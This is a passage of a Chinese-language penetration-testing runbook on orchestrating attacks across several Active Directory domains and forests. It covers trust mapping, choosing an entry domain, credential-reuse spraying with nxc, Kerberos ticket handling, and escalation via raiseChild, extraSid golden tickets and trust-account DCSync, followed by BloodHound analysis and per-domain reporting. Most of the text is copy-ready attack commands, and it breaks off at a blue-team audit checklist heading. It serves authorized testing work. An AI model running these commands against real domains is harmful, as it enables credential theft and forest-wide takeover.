# 多域作战流程(多域/多林/组合域编排)

多域环境的**编排层**打法:先测拓扑、选切入点,再逐域推进单域闭环,凭据按域隔离,命中跨域跳板后转专项链路,最后多域同库统一分析、按域分份交付。单点技术不重复:单域主线(凭据→横向→打域控→维持)见 [10-域渗透一条龙](10-域渗透一条龙.md);票据伪造/委托/gMSA 细节见 [12-Kerberos深度利用](12-Kerberos深度利用.md);信任机制、raiseChild、extraSid、信任密钥、SID Filtering 见 [22-域信任与跨林攻击](22-域信任与跨林攻击.md);项目工作区/报告/平台见 [99-环境与代理配置](99-环境与代理配置.md)。卡壳速查见 [TRICKS](TRICKS.md)。

占位符约定(全库统一基础上扩展):`<域A>`/`<域B>`(如 a.local/b.local,泛指项目里任意两个域)、`<父域>`/`<子域>`、`<林A根域>`/`<林B根域>`、`<域控IP>`、`<域控FQDN>`、`<用户>`、`<密码>`、`<NT哈希>`。本机事实:项目档案支持多域(看板「＋ 添加域」);`~/tools/bin/trust-map.sh`、`domain-setup.sh`、`bh-diff.py`、`report.sh`、`log-cred.sh` 均已在本机落位(下文逐个按源码口径给出行为)。

## ① 多域档案与拓扑 — 看板域档案、trust-map 测绘与信任方向判定

来源:本机实测 `~/tools/bin/trust-map.sh`(源码逐行核验);`~/tools/redops/server.py`(域档案 API);~/tools/redops/web/template.html`(看板按钮与执行台 datalist)

### 1.1 域档案(project.json domains[])

看板首页「常用入口」卡的 **「＋ 添加域」** 按钮等价于下面的 API 调用,把域追加进项目档案 `~/tools/projects/<名>/project.json` 的 `domains[]` 数组,每条形如 `{"name": "b.local", "dcip": "10.2.1.10", "dcfqdn": "dc01.b.local"}`:

```bash
# 追加域(缺省作用于当前激活项目;也可在 body 里加 "proj":"<项目名>" 指定)
curl -X POST http://127.0.0.1:8765/api/project/domain \
  -d '{"domain":"<域B>","dcip":"<域B控IP>","dcfqdn":"<域B控FQDN>"}'
# 查看当前项目全部域档案:
curl -s http://127.0.0.1:8765/api/project | python3 -m json.tool | grep -A8 domains
```

要点(redops 源码行为):

- **重名拒绝**:与已有域同名(忽略大小写)返回 400「域已存在」
- **首个域回填顶层字段**:项目建好后添加的第一个域会写进顶层 `domain/dcip/dcfqdn`(Ⓟ 预填与 10 号文档的 `<域>` 占位符用的就是顶层字段);后续域只进 `domains[]`
- **执行台多域下拉**:项目 `domains[]` 超过 1 条后,执行台所有带"域名"参数的工具(domain-setup 接入、BH 采集、DCSync、raiseChild、跨域金票等)的域名输入框自动挂 datalist 下拉(值=域名,提示=DC IP)——多域切换不再手敲
- trust-map.sh 与本文所有"遍历项目域"的循环,数据源都是 `domains[]`

### 1.2 trust-map.sh 一键测绘(输出格式以脚本源码为准)

```bash
# 对当前激活项目(或显式 PROJ_DIR)的全部域做信任测绘
PROJ_DIR=~/tools/projects/<名> ~/tools/bin/trust-map.sh <用户> <密码>
# 不传 PROJ_DIR 时自动用 ~/tools/projects/active.json 指向的激活项目
# 无域档案时报:「项目无域档案(看板「＋ 添加域」)」
```

脚本行为(源码逐行):对 `domains[]` 里每个域,用**同一组用户/密码**做 `ldapsearch -x -D "<域>\<用户>"` 绑定,查 `CN=System,<域DN>` 下的 `(objectClass=trustedDomain)` 对象;产出两个文件,**每次运行整体覆盖重写**(`> "$OUT"`)。`trust-map.txt` 的真实结构:

```text
== 信任拓扑测绘 14:32 ==
--- 域: a.local (DC: 10.1.1.10) ---
dn: CN=B.LOCAL,CN=System,DC=a,DC=local
cn: b.local
trustDirection: 3
trustAttributes: 32
(每个信任对象一组上述四行)
--- 域: b.local (DC: 10.2.1.10) ---
  (不可达或无信任/匿名拒绝)
== 拓扑图(mermaid,渲染:console 8080 或 mermaid.live)==
graph LR
产出: ~/tools/projects/<名>/trust-map.txt / trust-map.mmd
决策提示:双向/出站信任=可从该域打对端;TGT(信任账户)用于 22 号跨域伪造。
```

读法与坑:

- `trustDirection`/`trustAttributes` 是**十进制数**(如 32=0x20 林内信任、36=0x20+0x4 林内且开 SID 过滤、8=0x8 林信任),位表去 [22-域信任与跨林攻击](22-域信任与跨林攻击.md) ① 节逐位翻译;`trustType` 虽在查询里但被 grep 过滤,txt 中不出现
- `cn:` 即对端域名(信任对象名),配合本域节头 `--- 域:` 判断这条信任"谁指向谁"
- **凭据覆盖面**:脚本对每个域都用"当前循环域\用户"绑定验证——单组凭据通常只在其所属域(及同名同密的域)有效,其余域显示"(不可达或无信任/匿名拒绝)"属预期;换各域有效凭据**分批重跑**(配合 ② 节复用检测),注意输出是覆盖式,每批跑完先 `cp trust-map.txt trust-map.$(date +%m%d-%H%M).txt` 快照
- **`.mmd` 已知缺陷**:脚本第 24 行 grep 过滤后记录间空行被吃掉,而第 28-32 行生成 mermaid 边的 awk 依赖空行触发(经合成数据核验:现版本 `.mmd` 只有 `graph LR` 头、无边)。拓扑边直接读 txt 的 `trustDirection` 数值即可;要图就手工补采(单域直采保留空行,已验证可用):

```bash
# 单域手工补 mermaid 边(方向:2 出站 -->,1 入站 <--,其余/双向 <-->)
ldapsearch -o nettimeout=8 -LLL -x -H ldap://<域控IP> -D '<域>\<用户>' -w '<密码>' \
  -b "CN=System,DC=<域,点拆成 DC=xx>" '(objectClass=trustedDomain)' cn trustDirection trustAttributes 2>/dev/null \
  | grep -E '^(cn|trustDirection):|^$' \
  | awk -v src=<域> '/^cn:/{d2=$2} /^trustDirection:/{dir=$2} /^$/{if(d2!=""){e=(dir=="2")?"-->":((dir=="1")?"<--":"<-->"); printf "  %s[\"%s\"] %s %s[\"%s\"]\n",src,src,e,d2,d2; d2=""}} END{if(d2!=""){e=(dir=="2")?"-->":((dir=="1")?"<--":"<-->"); printf "  %s[\"%s\"] %s %s[\"%s\"]\n",src,src,e,d2,d2}}'
```

### 1.3 信任方向判定表(拿到 trustDirection 后怎么想)

| trustDirection | 含义 | mermaid 箭头 | 攻击视角 |
|---|---|---|---|
| 0 | 禁用 | (无边) | 死信任,别投入 |
| 1(入站) | **对方能来打我** | `<--` | 我是被信任方:对方域高权账户可作用于本域;防御上是我的暴露面,进攻上等对方域失守后自然波及 |
| 2(出站) | **我能过去打对方** | `-->` | 直接攻击面:我的凭据/票据可经信任作用于对端 |
| 3(双向) | 互相可达 | `<-->` | 双向都是攻击面 |

**只关心"我能过去"的方向(2 或 3)**——这是脚本决策提示「双向/出站信任=可从该域打对端」的口径。属性维度再叠一层:`trustAttributes` 带 0x20(林内信任,无 SID 过滤)→ 22 号 ③④ 的子域上提链可用;带 0x4(FILTER_SIDS,外部/林信任默认)→ extraSid 会被剥,转 22 号 ⑥ 的 FSP/信任密钥思路。方向+属性二维定打法,完整判读流程见 [22-域信任与跨林攻击](22-域信任与跨林攻击.md) ①⑥ 节。

## ② 切入决策 — 最弱域选择矩阵与凭据复用检测

来源:矩阵各行信号均为已入库打法(10/11/15/19 号);命令为本机工具口径

多域环境第一决策:**从哪个域下手**。原则是"最弱域突破 → 凭据/信任外溢到强域",而不是硬啃总部域。逐域把下表探一遍(每行命令可直接复制),命中越多越优先:

| 信号 | 探测命令(对该域域控) | 命中意味着 | 详见 |
|---|---|---|---|
| DC/域版本旧 | `nxc smb <域控IP> -u <用户> -p '<密码>'`(返回行带系统版本) | 2012R2 及更老 → MS14-068/ZeroLogon/noPac 一条 RCE 兜底 | [10](10-域渗透一条龙.md) 阶段 4.4 |
| 无 LAPS | `nxc ldap <域控IP> -u <用户> -p '<密码>' -M laps`(读不到/无属性) | 本地管理员密码全域复用 → 拿一台即横向一片 | [10](10-域渗透一条龙.md) 阶段 2.3③ |
| ADCS 在位 | `certipy find -u <用户>@<域> -p '<密码>' -dc-ip <域控IP> -vulnerable -json /tmp/certipy-<域>` | ESC1-13 任一命中即 DA 入口(现代域最常见) | [11-ADCS证书攻击](11-ADCS证书攻击.md) |
| Exchange 位 | `for p in owa ecp ews autodiscover; do curl -sk -o /dev/null -w '%{http_code} ' https://<Exchange主机>/$p; done` | OWA 喷洒面/ProxyLogon 系 RCE | [15-Exchange与ADFS](15-Exchange与ADFS.md) |
| SCCM 位 | `sccmhunter find -u <用户> -p '<密码>' -d <域> -dc-ip <域控IP> -dns-suffix <域>` | SCCM 管理员≈域管,NAA 雪球 | [19-SCCM与MECM](19-SCCM与MECM.md) |
| 凭据重叠 | 见下文复用检测循环 | 直接在对端域立足,零新漏洞 | 本节下文 |

### 同密码复用检测(已知 A 域凭据打各域)

```bash
# 账密版:对每个对端域控试同名同密(对 DC 默认走域验证,成功=A 域账户名+密码在该域也存在)
for DC in <域B控IP> <域C控IP> <域D控IP>; do
  echo "== $DC =="; nxc smb $DC -u <用户> -p '<密码>' --continue-on-success; done

# 哈希版(Kerberoast/DCSync 收来的 NT):
for DC in <域B控IP> <域C控IP>; do
  echo "== $DC =="; nxc smb $DC -u <用户> -H <NT哈希> --continue-on-success; done

# Kerberos 版(各域 realm 已按 ③ 节入 krb5.conf 后;票据按 ③ 节命名约定隔离):
echo '<密码>' | kinit -c ~/tools/projects/<名>/krb/<域B>_<用户>.ccache <用户>@<域B大写> \
  && KRB5CCNAME=~/tools/projects/<名>/krb/<域B>_<用户>.ccache klist
```

注意区分两种"跨域验证成功":**不带 `-d` 的同名同密**=对端域有同名账户且同密码(凭据重叠,本节目标);**带 `-d <源域>`**(如 `nxc smb <域B控IP> -u <用户> -p '<密码>' -d <域A>`)测的是信任透传(A 域身份经信任在 B 域生效,属于 ④ 节跨域跳板的前提验证)。喷洒节奏仍按 [TRICKS](TRICKS.md):先 `--pass-pol` 看锁定阈值,或用 spray-safe.sh 节流;字典按域生成:`PROJ_DIR=~/tools/projects/<名> ~/tools/bin/gen-wordlists.sh <域>`。

**决策规则**:命中凭据重叠 > 版本旧 RCE > ADCS > 无 LAPS > Exchange/SCCM 位(前两者直接给立足或 DA,后三者给强入口);全落空时选"采集面最肥"的域先跑 ⑤ 节 BH 采集,靠图上路径反推切入点。定下切入域后,其余域**先只做被动测绘**(trust-map + ② 的验证类命令,均为低噪),避免多域同时开花触发全域告警。

## ③ 逐域推进 — 接入循环、票据隔离与分域台账(与单域 Runbook 的衔接点)

来源:`~/tools/bin/domain-setup.sh`、`log-cred.sh` 源码;单域流程即 [10-域渗透一条龙](10-域渗透一条龙.md) 原样执行

核心原则:**域内的活全按 10 号 Runbook 不变**,本节只叠多域增量——接入×N、票据按域隔离、台账按域登记。逐域把阶段 0→5 跑成闭环,再换下一个域;不要三个域并行的半吊子推进。

### 3.1 接入循环(domain-setup 每域一次)

```bash
# 多域接入 = 对每个域各跑一次 domain-setup(对时+DNS+krb5.conf+kinit 验证一条命令)
for D in '<域A> <域A控IP> <域A控FQDN>' '<域B> <域B控IP> <域B控FQDN>'; do set -- $D
  sudo ~/tools/bin/domain-setup.sh $1 $2 $3 <用户> '<密码>'; done
```

domain-setup.sh 源码口径(多域相关):

- **krb5.conf 幂等追加**:每个 realm 追加一段(`[realms]` + `[domain_realm]`),realm 已存在则跳过——多域跑 N 次即 N 个 realm 共存,这是 ④ 节跨域 referral 追踪的前提(22 号 ④ 同款要求)
- **DNS 叠加**:走 resolv.conf 时每跑一次置顶一条 nameserver(多条共存按序回退);走 resolvectl 时单接口配置**互相覆盖**只留最后一家。同林域通常 DNS 互递归,一条即可解析全部;独立 DNS 的对端解析不到就写 `/etc/hosts` 兜底(域控 FQDN→IP)
- **kinit 落 root 缓存**:脚本整体 sudo 执行,第 4 步 kinit 的票据落在 root 的默认缓存——把它当"验证通过"信号即可,正式票据按下面命名约定自己 kinit
- 时间同步:每次只对当前域控对时;多域时间基偏差大时(罕见),打哪个域前重跑一次该域的 domain-setup

### 3.2 票据/凭据按域隔离(KRB5CCNAME 命名约定)

**约定:ccache 一律命名 `<域>_<用户>.ccache`,统一放项目目录 `krb/` 下**。impacket 全家吃 `KRB5CCNAME`,不隔离必然串票(拿 B 域票据去打 A 域,报的错还极具误导性):

```bash
P=~/tools/projects/<名>; mkdir -p $P/krb
# 取票(每域一张,互不覆盖):
echo '<密码>' | kinit -c $P/krb/<域A>_<用户>.ccache <用户>@<域A大写>
echo '<密码>' | kinit -c $P/krb/<域B>_<用户>.ccache <用户>@<域B大写>
# 用哪张切哪张:
export KRB5CCNAME=$P/krb/<域B>_<用户>.ccache && klist    # klist 看的就是当前指向
KRB5CCNAME=$P/krb/<域B>_<用户>.ccache impacket-psexec -k -no-pass <域>/<用户>@<域B控FQDN>
# 伪造票同样入约定(④ 节产物):raiseChild 的 -w 输出、ticketer 产物 →
#   mv raisechild.ccache $P/krb/<父域>_administrator.ccache
kdestroy    # 只销毁 KRB5CCNAME 当前指向的那张,切域前先确认指向
```

impacket-getTGT 默认落 `<用户>.ccache`(当前目录),拿到后立刻 `mv` 进约定路径。票据基础操作(kinit/klist/kdestroy/KRB5CCNAME/票据转换)详见 [12-Kerberos深度利用](12-Kerberos深度利用.md) 环境准备节。

### 3.3 台账按域登记

`log-cred.sh` 第 3 参就是"域"列——多域下这一列就是全部账本秩序,拿到凭据当场登记,别攒:

```bash
PROJ_DIR=~/tools/projects/<名> ~/tools/bin/log-cred.sh NT哈希 'B\svc_sql' B.LOCAL 'aad3..:31d6..' '<域B控IP> secretsdump' '服务账户/SPN MSSQLSvc'
PROJ_DIR=~/tools/projects/<名> ~/tools/bin/log-cred.sh 密码 jsmith A.LOCAL 'Passw0rd!' '<域A控IP> nxc 复用检测' 'A/B 两域同名同密'
```

执行台侧:多域项目里域名参数自动下拉(见 ①.1),执行产物/时间线本就按项目落 `loot/runs/` 与 `notes.md`;**注意 Ⓟ 预填永远是首个域**,切域打时手动改下拉,别被预填坑了串域。

## ④ 跨域跳板 — 哪些凭据天然跨域、命中后接 22 号哪条链

来源:跨域机制与命令全部出自 [22-域信任与跨林攻击](22-域信任与跨林攻击.md)(③④⑤⑥ 节),本节只做"手里有什么→走哪条"的分流,不复述参数

### 4.1 凭据的跨域属性(先搞清手里东西的作用域)

| 手里的凭据 | 跨域? | 机制口径 | 命中后接 |
|---|---|---|---|
| **Enterprise Admins / Schema Admins 成员凭据** | 天然全林 | EA(RID 519)/SA(RID 518)组**只存在于林根域**;其成员在任何域被拿到=林级权限(22 号 ③ 原理) | 直接对林根域控 DCSync([10](10-域渗透一条龙.md) 阶段 4.3) |
| 子域 DA(账密/哈希) | 林内可上提 | 林内信任(WITHIN_FOREST)历史不过滤 SID:子域 krbtgt 签票挂父域 EA 的 ExtraSid 即通行 | 22 号 ③ raiseChild 一键 / ④ 手工 extraSid(见下表) |
| 林根域 DA | 事实全林(林内) | 林根本身就是顶级;若还有出站林信任,再叠 ⑤ 跨林 | 林内全域 DCSync;跨林走 22 号 ⑤ |
| **密码重复账户**(② 节检出) | 人为跨域 | 同名同密在对端域是真实本地账户 | 直接当对端域用户走 10 号阶段 2 起步 |
| **gMSA 哈希** | 不跨 | 密码由本域 KDS 根密钥派生,只对本域 KDC 有意义 | 只在本域用(高权委托常见,[12](12-Kerberos深度利用.md) gMSA 节) |
| **机器账户** | 不跨 | 域本地主体;域控机器户价值在域内(DCSync/中继) | 本域横向;别浪费在对端域验证上 |
| **krbtgt 哈希** | 域内签名用 | 不直接跨域,但它是 extraSid 金票的**签名密钥**(子域 krbtgt 签子域票) | 22 号 ④ 手工链 |
| **信任账户哈希**(名字=对端林根 NetBIOS+`$`) | 跨林钥匙 | 林信任两侧对称存密,可签"目标林本地"票据 | 22 号 ⑤ 跨林金票 |

### 4.2 命中→链路分流表(全部细节在 22 号对应节)

| 你现在的位置 | 走哪条 | 22 号 |
|---|---|---|
| 子域 DA(林内) | `impacket-raiseChild '<子域>/<子域DA>:<密码>' -w raisechild.ccache`(票据 mv 进 ③.2 约定);OPSEC 敏感改手工链:子域 krbtgt 签票 + `-extra-sid <父域SID>-519` | ③ / ④ |
| 林根 DA + 出站林信任 | DCSync 拿信任账户(`-just-dc-user '<对端NetBIOS>$'`)→ ticketer 全写目标林根(签名密钥=信任密钥) | ⑤ |
| 信任带 0x4 FILTER_SIDS(外部/林信任) | extraSid 被剥:转外来安全主体(FSP)枚举/真凭据过信任;或信任密钥路线 | ⑥ |
| 只有凭据重叠(② 检出) | 不需要信任链——直接对端域走 10 号阶段 2 完整流程 | —(本文 ②③) |
| 跨域 referral 卡住 | 九成是 krb5.conf 缺对端 realm 或解析不到对端域控:回 ③.1 补接入/写 hosts | ④ 注意 |

**节奏建议**:每域阶段 5 落袋后(至少拿到该域 DA + krbtgt + 域 SID),再开跨域链——先把"当前域原料"收齐,跨域链是消费这些原料的下游。信任账户哈希、父域 SID 这类一次性原料,拿到的当场按 ③.3 登台账(票据类只记路径)。

## ⑤ 多域统一分析 — 同库多域采集、跨域路径查询、bh-diff 分域对比

来源:bloodhound-python 每域一采的口径见 22 号 ① 注意;BH CE 单库全局见 [99-环境与代理配置](99-环境与代理配置.md);`~/tools/bin/bh-diff.py` 源码核验

### 5.1 每域采集一次,导入同一库

bloodhound-python 只采**当前认证域**的对象(含 trustedDomain),所以多域 = 每域各采一次,拼出完整跨域图;BH CE 是全局单库(不按项目分库),全部导进同一个 http://127.0.0.1:8080 即可:

```bash
# 采集循环一行(每域一次;产物文件名自带域名与时间戳,导入时按名区分)
for D in '<域A> <域A控FQDN> <域A控IP>' '<域B> <域B控FQDN> <域B控IP>' '<域C> <域C控FQDN> <域C控IP>'; do set -- $D
  bloodhound-python -u <用户> -p '<密码>' -d $1 -dc $2 -ns $3 -c All --zip; done
# 导入:浏览器 8080 → Upload → 逐个上传各域 zip(99 号「BloodHound CE」节)
```

各域都用**该域自己的有效凭据**(③.2 的票据隔离同样适用于采集;哪域没凭据就哪域先跳过,图上该域节点缺失≠该域安全)。

### 5.2 跨域攻击路径查询(Cypher)

边名口径同 [12-Kerberos深度利用](12-Kerberos深度利用.md) 附录(CE schema 核实);`TrustedBy` 即 22 号 ① 说的域节点间信任边。多域导入后在查询框直接粘:

```bash
# 信任边全景:谁信任谁(先跑这条,和 ① 节 trust-map.txt 互相印证)
MATCH (a:Domain)-[:TrustedBy]->(b:Domain) RETURN a.name, b.name
# 全林最短路径:任一域的低权用户 → 任意域的 Domain Admins(可传递控制边 + 信任边一起算,跨域路径才连得起来)
MATCH p=shortestPath((u:User)-[:MemberOf|AdminTo|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AllExtendedRights|AddMember|AddKeyCredentialLink|DCSync|GetChanges|GetChangesAll|AllowedToDelegate|AllowedToAct|TrustedBy*1..]->(g:Group)) WHERE toUpper(g.name) ENDS WITH 'DOMAIN ADMINS' RETURN p LIMIT 25
# 12 号附录其余查询(可烤 SPN/UD 主机/RBCD 候选/LAPS 可读/DCSync 候选…)多域导入后自动变"全林版",逐条重跑一遍
```

看图重点:跨域边(`TrustedBy`)旁边的用户/组挂载点——A 域某用户被加进 B 域组(BH 图上 MemberOf 跨域组),就是"天然跳板",对上 ④.1 的 FSP 思路。

### 5.3 bh-diff 分域对比(阶段推进证据)

`bh-diff.py` 对比**两次采集**的 users/computers/groups/trusts 四类实体,输出 新增(+)/消失(-)/标记变化(Δ) 三行一表,并对 adminCount/无约束委托/SPN/AS-REP/信任 变化计"高价值"数。多域用法:**同域两时点对比**(推进一轮后重采该域再比,证明攻击面变化);跨域对比无意义(不同实体空间,全表都是"+"噪音):

```bash
# 域 A 推进前后对比(zip 或解包目录均可):
python3 ~/tools/bin/bh-diff.py <域A旧采集zip> <域A新采集zip>
# 关注信任行:"+ | 信任 | <对端域名>" = 期间新建立了信任(防御侧异动,也可能是对端域新开了攻击面)
# 执行台「运维」组有同名「BH 采集差异」按钮(old/new 填两个 zip 路径)
```

## ⑥ 分域交付 — report.sh 分域报告、总控拼装与审计事件分域核对表

来源:`~/tools/bin/report.sh` 源码核验;审计事件出自 [10](10-域渗透一条龙.md) OPSEC/场景矩阵与 [22](22-域信任与跨林攻击.md) ⑦ 节

### 6.1 report.sh 的多域事实与分域过滤

`report.sh <项目名>` 从项目目录一键生成 report.md + report.html(自包含可发客户,凭据截断)。源码事实:**报告头部的"目标域"读的是 project.json 顶层 `domain` 字段(=首个域)**,多域项目头部只显示首域——真实多域面在报告一节的 project.json 档案(domains[] 全量收录)与凭据台账"域"列里。分域核对靠台账域列过滤:

```bash
P=~/tools/projects/<名>
# 某域的凭据清单(域列大小写不敏感):
awk -F, 'NR==1 || tolower($4)=="a.local"' $P/creds.csv
# 各域凭据计数一览:
awk -F, 'NR>1 && $4!="" {print tolower($4)}' $P/creds.csv | sort | uniq -c | sort -rn
```

### 6.2 总控报告拼装(每域一份 + 总控一页)

一个项目装多域时,交付物 = 项目总报告(时间线/台账/覆盖矩阵/产物索引,report.sh 全自动)+ 你手工拼的"总控页"(拓扑 + 分域状态)。notes.md 本就支持手工追加(执行台每步自动记,人工复盘直接往下写),report.sh 的"攻击时间线"一节会全量收录——把多域摘要写进去再出报告:

```bash
P=~/tools/projects/<名>
cp $P/trust-map.txt $P/trust-map.$(date +%m%d-%H%M).txt   # ① trust-map 覆盖式输出,先快照留档
{
  echo ""; echo "## 多域总控摘要($(date '+%F %H:%M'))"; echo '```'; cat $P/trust-map.txt; echo '```'
  for D in $(python3 -c "import json;print(' '.join(x['name'] for x in json.load(open('$P/project.json'))['domains']))"); do
    N=$(awk -F, -v d="$D" 'NR>1 && tolower($4)==tolower(d)' $P/creds.csv | grep -c .)
    echo "- 域 $D:凭据 $N 条(明细见台账域列过滤)"; done
} >> $P/notes.md
~/tools/bin/report.sh <名>    # → $P/report.md / report.html(拓扑+分域计数进时间线一节)
```

若客户按域验收(常见:子公司域各自成报告),把每域建成独立项目跑同款流程(99 号「多项目工作区」),单域项目 report.sh 头部即正确显示该域——**一个项目装一林、跨域链留总控页**是较顺的交付切分。

### 6.3 审计事件分域核对表(给蓝队的溯源清单,按域各复制一份)

事件分散在**各自域的域控**日志里,多域溯源必须分域核对(事件号出处:10 号场景矩阵/OPSEC、22 号 ⑦):
